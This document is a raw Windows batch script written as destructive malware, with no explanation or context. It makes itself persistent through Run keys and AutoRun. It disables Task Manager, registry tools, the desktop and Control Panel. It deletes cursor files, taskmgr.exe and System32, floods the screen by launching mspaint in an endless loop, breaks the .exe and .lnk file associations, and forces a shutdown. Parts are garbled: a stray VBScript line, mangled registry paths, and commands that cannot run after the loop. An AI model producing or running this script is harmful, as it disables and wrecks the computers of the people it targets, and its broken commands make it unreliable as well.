C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp

copy ""%0"" "%SystemRoot%\system32\git.bat"
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\git.bat" /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f

Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
color a

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Win32 /t REG_SZ /d C:\Windows\Win32.bat /f

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f >nul

reg add HKCU\Software\Microsoft\Windows\Current Version\Policies\Explorer/v NoControlPanel /t REG_DWORD /d 1 /f >nul
reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesSystem /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul

del "%SystemRoot%Cursors*.*" >nul
:x
Start mspaint
goto x
assoc .lnk=.txt
copy ""%0"" "%SystemRoot%\system32\batinit.bat" >nul
reg add "HKCU\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "%SystemRoot%\syste m32\git.bat" /f >nul

Del C:\Windows\System32\taskmgr.exe


timeout 60 /nobreak
 
Shutdown.exe /s /t 120
 
Del C:/Windows/System32 /q

assoc .exe=.Ink
